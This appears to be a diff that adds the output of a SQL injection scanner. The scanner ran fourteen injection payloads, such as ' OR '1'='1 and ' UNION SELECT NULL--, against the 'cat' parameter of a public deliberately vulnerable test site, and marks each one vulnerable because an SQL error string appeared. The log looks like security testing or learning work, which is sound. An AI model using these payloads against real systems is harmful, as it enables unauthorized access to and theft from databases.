@@ -1,0 +1,109 @@
+SQL Injection Scan Results
+==================================================
+Scan completed at: 2026-02-21 11:41:10.894779
+Total tests: 14
+
+Vulnerable: 14
+Suspicious: 0
+Safe: 0
+
+--------------------------------------------------
+
+Time: 2026-02-21T11:40:57.264589
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: ' OR '1'='1
+Status: VULNERABLE
+Info: Found SQL error indicator: sql syntax
+
+Time: 2026-02-21T11:40:58.313834
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: ' OR '1'='1' --
+Status: VULNERABLE
+Info: Found SQL error indicator: sql syntax
+
+Time: 2026-02-21T11:40:59.361705
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: ' OR '1'='1' /*
+Status: VULNERABLE
+Info: Found SQL error indicator: sql syntax
+
+Time: 2026-02-21T11:41:00.409021
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: admin' --
+Status: VULNERABLE
+Info: Found SQL error indicator: sql syntax
+
+Time: 2026-02-21T11:41:01.458276
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: admin' #
+Status: VULNERABLE
+Info: Found SQL error indicator: sql syntax
+
+Time: 2026-02-21T11:41:02.509111
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: ' UNION SELECT NULL--
+Status: VULNERABLE
+Info: Found SQL error indicator: sql syntax
+
+Time: 2026-02-21T11:41:03.554412
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: 1' OR '1'='1
+Status: VULNERABLE
+Info: Found SQL error indicator: sql syntax
+
+Time: 2026-02-21T11:41:04.605501
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: ' OR 1=1--
+Status: VULNERABLE
+Info: Found SQL error indicator: sql syntax
+
+Time: 2026-02-21T11:41:05.660383
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: 1' AND '1'='1
+Status: VULNERABLE
+Info: Found SQL error indicator: sql syntax
+
+Time: 2026-02-21T11:41:06.790123
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: ') OR ('1'='1
+Status: VULNERABLE
+Info: Found SQL error indicator: sql syntax
+
+Time: 2026-02-21T11:41:07.749178
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: 1' OR 1=1#
+Status: VULNERABLE
+Info: Found SQL error indicator: sql syntax
+
+Time: 2026-02-21T11:41:08.836605
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: ' OR 1=1#
+Status: VULNERABLE
+Info: Found SQL error indicator: sql syntax
+
+Time: 2026-02-21T11:41:09.846586
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: 1' OR '1'='1'--
+Status: VULNERABLE
+Info: Found SQL error indicator: sql syntax
+
+Time: 2026-02-21T11:41:10.893976
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: 1' OR '1'='1'/*
+Status: VULNERABLE
+Info: Found SQL error indicator: sql syntax
+
